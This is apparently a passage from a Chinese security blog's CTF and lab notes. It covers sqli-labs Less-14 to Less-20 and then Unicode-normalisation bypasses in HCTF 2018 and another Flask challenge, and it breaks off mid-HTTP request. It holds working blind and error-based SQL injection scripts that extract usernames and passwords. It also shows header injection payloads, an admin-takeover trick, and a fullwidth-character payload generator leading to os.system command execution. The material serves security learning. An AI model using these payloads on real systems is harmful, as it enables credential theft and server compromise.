<p>原理同<strong>Less-5</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-14/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&#x27;-1&quot; union select 1,count(*) as a from information_schema.tables group by concat((select concat(username,&quot;,&quot;,password) from users limit 0,1),&quot; &quot;, floor(rand(0)*2)) #&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
<h3 id="x05-post单查询盲注">0X05 POST单查询盲注</h3>
<h4 id="less-15-基于时间的post单引号字符型盲注">Less-15
基于时间的POST单引号字符型盲注</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-15/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(username,&#x27; &#x27;,password) from users&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    startTime = time.time()</span><br><span class="line">    payload = <span class="string">&quot;admin&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,sleep(2),1) #&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uname&quot;</span>: payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))=&#123;mid&#125;,sleep(2),1) #&quot;</span></span><br><span class="line">            startTime = time.time()</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), mid=<span class="built_in">str</span>(j))</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h4 id="less-16-基于时间的post双引号变形字符型盲注">Less-16
基于时间的POST双引号变形字符型盲注</h4>
<p>和<strong>Less-15</strong>差不多，测试一下使用双引号加右括号构造闭合。</p>
<h3 id="x06-post更新注入">0x06 POST更新注入</h3>
<h4 id="less-17-基于错误的post更新注入">Less-17
基于错误的POST更新注入</h4>
<p>随手测试了一下，<strong>usernae</strong>被过滤了，<strong>password</strong>可以注入。</p>
<h5 id="相关补充-2">相关补充</h5>
<h6
id="extractvaluexml_fragxpath_expr">extractvalue(xml_frag,xpath_expr)</h6>
<p>这里需要提及的一个是<strong>extractvalue(xml_frag,xpath_expr)</strong>函数，作用是对<strong>xml</strong>文档进行查询，其中第一个接收的参数是文件名，第二个则是文件路径，因此对第二个参数传入的值会做检测，判断是否满足如<strong>/xxx/xxx/xxx/</strong>的<strong>xpath</strong>格式，错误则会返回该值并报错，由于传入的是查询语句，因此会在执行后获取返回值再判断，故返回的是查询结果，从而达到攻击目的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=admin&#x27; or extractvalue(1,concat(&#x27;~&#x27;,(select * from (select concat_ws(&#x27;,&#x27;,id,username,password) from users limit 0,1) a))) --+&amp;uname=admin</span><br></pre></td></tr></table></figure>
<h6
id="updatexmlxml_targetxpath_exprnew_xml">updatexml(xml_target,xpath_expr,new_xml)</h6>
<p>将<strong>xml_target</strong>中的数据使用<strong>xpath_expr</strong>正则匹配替换为<strong>new_xml</strong>，报错原理同上。</p>
<p>故此，思路是要使得<strong>extractvalue()</strong>函数报错，因此构造<strong>extractvalue(1,concat('~',(select
database())))</strong>，同理，使用<strong>updatexml()</strong>构造的<strong>payload</strong>为<strong>updatexml(1,concat('~',(select
database())),0)</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd=admin&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select * from (select concat_ws(&#x27;,&#x27;,id,username,password) from users limit 0,1) a)),0) --+&amp;uname=admin</span><br></pre></td></tr></table></figure>
<h4 id="less-18-基于错误的post-user-agent注入">Less-18 基于错误的POST
User-Agent注入</h4>
<h5 id="相关补充-3">相关补充</h5>
<h6 id="http头部详解">HTTP头部详解</h6>
<ul>
<li><strong>Accept</strong>：客户端申明自己接受的介质类型，<strong>/</strong>表示任何类型，<strong>type/</strong><em>表示该类型下的所有子类型，如<strong>text/</strong></em>，<strong>type/sub-type</strong>表示单独一种类型，如<strong>text/html</strong>。</li>
<li><strong>Accept-Charset</strong>：客户端申明自己接收的字符集。</li>
<li><strong>Accept-Encoding</strong>：客户端申明自己接收的编码函数，通常指定压缩函数，是否支持压缩，
支持什么压缩函数【<strong>gzip、deflate</strong>。</li>
<li><strong>Accept-Language</strong>：客户端申明自己接收的语言，语言跟字符集的区别：中文是语言，中文有多种字符集，比如<strong>big5、gb2312、gbk</strong>等等。</li>
<li><strong>Accept-Ranges</strong>：<strong>Web</strong>服务器表明自己是否接受获取其某个实体的一部分【比如文件的一部分的请求。<strong>bytes</strong>表示接受，<strong>none</strong>表示不接受。</li>
<li><strong>Age</strong>：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</li>
<li><strong>Authorization</strong>：当客户端接收到来自<strong>Web</strong>服务器的<strong>WWW-Authenticate</strong>响应时，用该头部来回应自己的身份验证信息给<strong>Web</strong>服务器。</li>
<li><strong>Cache-Control</strong>：请求：<strong>no-cache</strong>【不要缓存的实体，要求现在从<strong>Web</strong>服务器去取；<strong>max-age</strong>【只接受<strong>Age</strong>值小于<strong>max-age</strong>值，并且没有过期的对象；<strong>max-stale</strong>【可以接受过去的对象，但是过期时间必须小于<strong>max-stale</strong>值；<strong>min-fresh</strong>【接受其新鲜生命期大于其当前<strong>Age</strong>跟<strong>min-fresh</strong>值之和的缓存对象。响应：<strong>public【</strong>可以用<strong>Cached</strong>内容回应任何用户；<strong>private</strong>【只能用缓存内容回应先前请求该内容的那个用户；<strong>no-cache</strong>【可以缓存，但是只有在跟<strong>Web</strong>服务器验证了其有效后，才能返回给客户端；<strong>max-age</strong>:【本响应包含的对象的过期时间。ALL：<strong>no-store</strong>【不允许缓存。</li>
<li><strong>Connection</strong>：请求：<strong>close</strong>【告诉<strong>Web</strong>服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了；<strong>keepalive</strong>【告诉<strong>Web</strong>服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求。响应：<strong>close</strong>【连接已经关闭；<strong>keepalive</strong>【连接保持着，在等待本次连接的后续请求；<strong>Keep-Alive</strong>【如果客户端请求保持连接，则该头部表明希望<strong>Web</strong>服务器保持连接多长时间【秒。如<strong>Keep-Alive:
300</strong>。</li>
<li><strong>Content-Encoding</strong>：<strong>Web</strong>服务器表明自己使用了什么压缩函数【<strong>gzip、deflate</strong>压缩响应
中的对象。如<strong>Content-Encoding: gzip</strong>。</li>
<li><strong>Content-Language</strong>：<strong>Web</strong>服务器告诉客户端自己响应的对象的语言。</li>
<li><strong>Content-Length</strong>：<strong>Web</strong>服务器告诉客户端自己响应的对象的长度。如<strong>Content-Length:
26012</strong>。</li>
<li><strong>Content-Range</strong>：<strong>Web</strong>服务器表明该响应包含的部分对象为整个对象的哪个部分。如<strong>Content-Range:
bytes 21010-47021/47022</strong>。</li>
<li><strong>Content-Type</strong>：<strong>Web</strong>服务器告诉客户端自己响应的对象的类型。如<strong>Content-Type:
application/xml</strong>。</li>
<li><strong>ETag</strong>：就是一个对象【如<strong>URL</strong>的标志值，就一个对象而言，比如一个<strong>html</strong>文件，
如果被修改了，其<strong>Etag</strong>也会别修改，所以<strong>ETag</strong>的作用跟<strong>Last-Modified</strong>的作用差不多，主
要供<strong>Web</strong>服务器判断一个对象是否改变了。比如前一次请求某个<strong>html</strong>文件时，获得了其<strong>ETag</strong>，当这次又请求这个文件时，客户端就会把先前获得的<strong>ETag</strong>值发送给<strong>Web</strong>服务器，
然后<strong>Web</strong>服务器会把这个<strong>ETag</strong>跟该文件的当前<strong>ETag</strong>进行对比，然后就知道这个文件有没有改变了。</li>
<li><strong>Expired</strong>：<strong>Web</strong>服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟<strong>Web</strong>服务器验证了其有效性后，才能用来响应客户请求，<strong>HTTP/1.0</strong>的头部。如<strong>Expires:
Sat, 23 May 2009 10:02:12 GMT</strong>。</li>
<li><strong>Host</strong>：客户端指定自己想访问的<strong>Web</strong>服务器的<strong>Domain/IP</strong>地址和端口号。如<strong>Host:
southsea.st</strong>。</li>
<li><strong>If-Match</strong>：如果对象的<strong>ETag</strong>没有改变，其实也就意味著对象没有改变，才执行请求的动作。</li>
<li><strong>If-None-Match</strong>：如果对象的<strong>ETag</strong>改变了，其实也就意味著对象也改变了，才执行请求的动作。</li>
<li><strong>If-Modified-Since</strong>：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作【比如返回对象，否则返回代码<strong>304</strong>，告诉客户端该对象没有修改。如<strong>If-Modified-Since:
Thu, 10 Apr 2008 09:14:42 GMT</strong>。</li>
<li><strong>If-Unmodified-Since</strong>：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作【比如返回对象。</li>
<li><strong>If-Range</strong>：客户端告诉<strong>Web</strong>服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。客户端通过发送请求对象的<strong>ETag</strong>或者自己所知道的最后修改时间给<strong>Web</strong>服务器，让其判断对象是否改变了。总是跟<strong>Range</strong>头部一起使用。</li>
<li><strong>Last-Modified</strong>：<strong>Web</strong>服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。如<strong>Last-Modified:
Tue, 06 May 2008 02:42:43 GMT</strong>。</li>
<li><strong>Location</strong>：<strong>Web</strong>服务器告诉客户端，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如:
<strong>Location: https://southsea.st</strong>。</li>
<li><strong>Pramga</strong>：主要使用<strong>Pramga:
no-cache</strong>，相当于<strong>Cache-Control:
no-cache</strong>。如<strong>Pragma: no-cache</strong>。</li>
<li><strong>Proxy-Authenticate</strong>：代理服务器响应客户端，要求其提供代理身份验证信息。<strong>Proxy-Authorization</strong>：客户端响应代理服务器的身份验证请求，提供自己的身份信息。</li>
<li><strong>Range</strong>：客户端【比如<strong>Flashget</strong>多线程下载时告诉<strong>Web</strong>服务器自己想取对象的哪部分。如<strong>Range:
bytes=1173546-</strong>。</li>
<li><strong>Referer</strong>：客户端向<strong>Web</strong>服务器表明自己访问当前请求的来源。如<strong>Referer:
https://southsea.st</strong>。</li>
<li><strong>Server</strong>：<strong>Web</strong>服务器表明自己是什么软件及版本等信息。如<strong>Server:
Apache/2.0.61(Unix)</strong>。</li>
<li><strong>User-Agent</strong>：客户端表明自己的身份【哪种客户端。如<strong>Mozilla/5.0
(Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/76.0.3809.100 Safari/537.36</strong>。</li>
<li><strong>Transfer-Encoding</strong>：<strong>Web</strong>服务器表明自己对本响应消息体【不是消息体里面的对象作了怎样的编码，比如是否分块【<strong>chunked</strong>。如<strong>Transfer-Encoding:
chunked</strong>。</li>
<li><strong>Vary</strong>：<strong>Web</strong>服务器用该头部的内容告诉<strong>Cache</strong>服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源<strong>Web</strong>服务器在接到第一个请求消息时，其响应消息的头部为<strong>Content-Encoding:
gzip; Vary:
Content-Encoding</strong>，那么<strong>Cache</strong>服务器会分析后续请求消息的头部，检查其<strong>Accept-Encoding</strong>，是否跟先前响应的<strong>Vary</strong>头部值一致，即是否使用相同的内容编码函数，这样就可以防止<strong>Cache</strong>服务器用自己<strong>Cache</strong>里面压缩后的实体响应给不具备解压能力的客户端。如<strong>Vary:
Accept-Encoding</strong>。</li>
<li><strong>Via</strong>：列出从客户端到<strong>OCS</strong>或者相反方向的响应经过了哪些代理服务器，他们用什么协议【版本发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加<strong>Via</strong>头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的<strong>Via</strong>头部，并
把自己的相关信息加到后面，以此类推，当<strong>OCS</strong>收到最后一个代理服务器的请求时，检查<strong>Via</strong>头部，就知道该请求所经过的路由。如<strong>Via:
1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</strong>。</li>
</ul>
<p>根据提示，修改<strong>User-Agent</strong>的值来注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: 1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select * from (select concat_ws(&#x27;,&#x27;,id,username,password) from users limit 0,1) a))) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<h4 id="less-19-基于错误的post-referer注入">Less-19 基于错误的POST
Referer注入</h4>
<p>根据提示，修改<strong>Referer</strong>的值如上。</p>
<h4 id="less-20-基于错误的post-cookie注入">Less-20 基于错误的POST
Cookie注入</h4>
<p>根据提示，修改<strong>Cookie</strong>的值如上。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL</tag>
        <tag>CTF</tag>
        <tag>Web安全修炼计划</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode编码与Python中的SSTI</title>
    <url>/Study-SSTI-Unicode/</url>
    <content><![CDATA[<p>记一下关于最近遇到的两题<strong>SSTI</strong>中有关<strong>Unicode</strong>绕过的题。</p>
<span id="more"></span>
<h1 id="x00">0x00</h1>
<p><strong>HCTF
2018</strong>的题，在<strong>/change</strong>页面右键源代码提示了<a
href="https://github.com/woadsl1234/hctf_flask/">源码</a>。</p>
<p>然后就是审计了，共三种解法，单独记录一下<strong>Unicode</strong>相关的。</p>
<h2 id="关于unicode编码的绕过">关于Unicode编码的绕过</h2>
<p>在<strong>routes.py</strong>下，路由<strong>/change</strong>和<strong>/register</strong>以及<strong>/login</strong>中在处理用户名都调用了一个方法<strong>strlower()</strong>，跟进看一下，调用了<strong>nodeprep.prepare()</strong>。</p>
<p>查了一下相关资料，即该函数会将<strong>Unicode</strong>编码中特殊的畸形字符转化为对应的大写英文，将大写英文转化成对应的小写英文。</p>
<blockquote>
<p>特殊的畸形字符：比如上下标的<strong>ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ......</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">	<span class="comment"># ......</span></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="comment"># ......</span></span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="comment"># ......</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    <span class="comment"># ......</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<p>因此思路如下：</p>
<ul>
<li>注册用户<strong>ᴬdmin</strong>，转换后变成<strong>Admin</strong>存入数据库。</li>
<li>登陆用户<strong>ᴬdmin</strong>，转换后，实际登陆的是<strong>Admin</strong>。</li>
<li>修改用户，从<strong>session</strong>中取值<strong>Admin</strong>，转换后变成<strong>admin</strong>存入数据库。</li>
<li>最后直接登陆<strong>admin</strong>。</li>
</ul>
<h1 id="x01">0x01</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,send_from_directory</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">blacklist = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.php&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hello</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/equ.php&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Equ</span>():</span><br><span class="line">    left = request.form[<span class="string">&#x27;left&#x27;</span>]</span><br><span class="line">    right = request.form[<span class="string">&#x27;right&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(left) &gt; <span class="number">100</span> <span class="keyword">or</span> <span class="built_in">len</span>(right) &gt; <span class="number">100</span> :</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;equ.html&quot;</span>,equation=<span class="string">&quot;NO&quot;</span>,result=<span class="string">&#x27;Hacker&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> left:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;equ.html&quot;</span>,equation=<span class="string">&quot;NO&quot;</span>,result=ch)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> right:</span><br><span class="line">            <span class="keyword">if</span> ch <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;equ.html&quot;</span>,equation=<span class="string">&quot;NO&quot;</span>,result=ch)</span><br><span class="line">            equstr = <span class="string">f&quot;<span class="subst">&#123;left&#125;</span> = <span class="subst">&#123;right&#125;</span> ?&quot;</span></span><br><span class="line">            <span class="built_in">exec</span>(<span class="string">f&quot;res=<span class="subst">&#123;left&#125;</span>==<span class="subst">&#123;right&#125;</span>&quot;</span>)</span><br><span class="line">            result= <span class="built_in">locals</span>()[<span class="string">&#x27;res&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;equ.html&quot;</span>,equation=equstr,result=result)</span><br><span class="line">        </span><br><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span></span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">static_from_root</span>():</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(app.static_folder, request.path[<span class="number">1</span>:])</span><br><span class="line">        </span><br><span class="line"><span class="meta">        @app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">miss</span>(<span class="params">e</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">            &lt;hr&gt;&lt;center&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>, <span class="number">404</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="string">&quot;true&quot;</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure>
<p>在<strong>Equ</strong>处进行了一次黑名单判断，如果存在<strong>blacklist</strong>中的字符则停止解析。</p>
<p>根据<strong>HCTF</strong>那题的源码，编写一下<strong>Payload</strong>生成脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典不全，因为使用的是dic[key]=value</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">alpha_dic = [i <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_letters]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>):</span><br><span class="line">    tmp = <span class="string">b&quot;\u&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">4</span>).encode()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        low = lower(tmp.decode(<span class="string">&quot;unicode-escape&quot;</span>))</span><br><span class="line">        original = tmp.decode(<span class="string">&quot;unicode-escape&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> low <span class="keyword">in</span> alpha_dic <span class="keyword">and</span> original <span class="keyword">not</span> <span class="keyword">in</span> alpha_dic <span class="keyword">and</span> <span class="built_in">len</span>(low) == <span class="number">1</span>:</span><br><span class="line">            dic[lower(tmp.decode(<span class="string">&quot;unicode-escape&quot;</span>))] = tmp.decode(<span class="string">&quot;unicode_escape&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;print(exec(request.args[&quot;1&quot;]))&quot;&quot;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        res += dic[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>附上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left=ｐｒｉｎｔ(&quot;ａ&quot;)&amp;right=ｐｒｉｎｔ(ｅｘｅｃ(ｒｅｑｕｅｓｔ.ａｒｇｓ[&quot;1&quot;]))</span><br></pre></td></tr></table></figure>
<p>构造请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/equ.php?1=__import__(%27os%27).system(%27cat%20/flag%20%3E%20templates/index.html%27)</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5001</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>284</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;.Not/A)Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;103&quot;, &quot;Chromium&quot;;v=&quot;103&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:5001</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span 